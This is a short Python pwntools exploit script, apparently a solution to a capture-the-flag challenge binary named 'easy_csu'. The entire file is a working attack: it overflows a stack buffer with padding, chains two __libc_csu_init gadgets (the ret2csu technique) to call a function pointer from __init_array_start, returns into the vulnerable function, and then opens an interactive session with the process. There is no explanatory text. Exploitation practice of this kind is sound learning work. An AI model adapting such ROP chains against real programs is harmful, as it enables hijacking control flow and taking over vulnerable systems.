from pwn import *

sh = process('./easy_csu')
elf = ELF('easy_csu')

gadget1 = 0x401202
gadget2 = 0x4011e8

init_addr = elf.symbols['__init_array_start']
vul_addr = elf.symbols['vul']

payload = 'a' * (0x20 + 0x8)
payload += p64(gadget1) + p64(0) + p64(1) + p64(init_addr) + p64(0) + p64(0)+ p64(3)
payload += p64(gadget2) + 'a' * 56
payload += p64(vul_addr)

sh.sendline(payload)

sh.interactive()
sh.close()